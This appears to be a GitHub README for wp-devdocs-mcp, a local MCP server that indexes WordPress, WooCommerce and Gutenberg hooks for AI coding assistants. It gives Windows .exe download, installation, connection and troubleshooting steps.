# ⚙️ wp-devdocs-mcp - Verified WordPress Hook Database

[![Download wp-devdocs-mcp](https://img.shields.io/badge/Download-wp--devdocs--mcp-green?style=for-the-badge)](https://github.com/ankit2160/wp-devdocs-mcp/releases)

---

## 🗂 What is wp-devdocs-mcp?

wp-devdocs-mcp is a local server for your computer. It stores and organizes information about WordPress hooks. Hooks are parts of WordPress code that let plugins and themes add or change features. This tool collects every action, filter, block registration, and JavaScript API call from WordPress and its plugins like WooCommerce and Gutenberg. 

It creates a verified database you can use with AI code helpers. These helpers usually guess hook names from past training data. wp-devdocs-mcp prevents those guesses by providing accurate, up-to-date data taken directly from the actual code.

This app works with AI tools such as Claude Code, Cursor, Windsurf, or any software that supports the MCP protocol.

---

## 🚀 Getting Started: Download and Setup

1. Go to the download page using this link:

   [**Download wp-devdocs-mcp**](https://github.com/ankit2160/wp-devdocs-mcp/releases)

   This will take you to the official releases page on GitHub.

2. Look for the latest version of wp-devdocs-mcp for Windows. Find the file with `.exe` at the end.

3. Click the `.exe` file name to download it to your computer.

4. Once the download finishes, find the file in your downloads folder.

5. Double-click the `.exe` file to start the installation.

6. Follow the installer prompts. You can usually accept the default options.

7. When the installation completes, open wp-devdocs-mcp from your Start menu or desktop shortcut.

---

## 💾 System Requirements

- Windows 10 or later (64-bit recommended)
- At least 4 GB of free RAM
- At least 200 MB of free disk space
- Internet connection for first setup and updates
- Administrator rights to install the software

---

## ⚙️ How Does it Work?

wp-devdocs-mcp scans the WordPress source code and any plugins you add. It finds all named hooks and API calls. Then it creates a local database that AI tools can query.

Using this database, AI assistants stop guessing hook names and start using verified names from your active WordPress environment.

The MCP server runs locally. This means your data stays on your computer. There is no need to send code or hooks to an external service.

Because the data is accurate and current, your AI code helpers give better, more reliable results.

---

## 🖥 Using wp-devdocs-mcp with AI Tools

To use wp-devdocs-mcp with AI assistants like Claude Code or Windsurf:

1. Make sure wp-devdocs-mcp is running on your computer.

2. Open your AI tool and go to its settings or MCP integration section.

3. Enter the address of your local MCP server. Usually, this looks like `http://localhost:4000`.

4. Save the settings.

5. When coding with your AI assistant, it will now search wp-devdocs-mcp’s database for WordPress hooks.

Most AI tools will have clear guidance on how to connect to an MCP server. Check their support pages if you need help.

---

## 🔧 Configuration and Customization

- You can add additional WordPress plugins to wp-devdocs-mcp. This helps the server learn hooks from those plugins too.

- To add plugins, place their files in the folder set up during installation or specify plugin paths in the configuration file.

- The server will index the new plugins on restart.

- You can change the port number if it conflicts with other apps by editing the `config.json` file in the installation folder.

- Logs and error messages save in a folder named `logs`. Review these if you have connection issues.

---

## 🛠 Troubleshooting

- If the AI tool cannot connect to wp-devdocs-mcp, check if the software is running.

- Make sure the firewall or antivirus is not blocking the server.

- Confirm you used the correct address and port in the AI’s settings.

- Restart wp-devdocs-mcp and your AI tool if you run into problems.

- Consult the `logs` folder for detailed error information.

---

## 🔄 Updates

Check the GitHub releases page regularly:

[**Download Updates**](https://github.com/ankit2160/wp-devdocs-mcp/releases)

Download the new `.exe` file and run it to update your local server. The update process keeps your current settings.

---

## ⚖️ Why Use wp-devdocs-mcp?

AI coding helpers often make mistakes guessing hook names. Mistakes can lead to errors or code that does not work.

wp-devdocs-mcp gives your AI helpers real data from the source code. This lowers mistakes and boosts the quality of code suggestions.

You won’t depend on incomplete or outdated training data. Instead, your tools will have the right names and calls for actions, filters, blocks, and JS APIs.

---

[![Download wp-devdocs-mcp](https://img.shields.io/badge/Download-wp--devdocs--mcp-green?style=for-the-badge)](https://github.com/ankit2160/wp-devdocs-mcp/releases)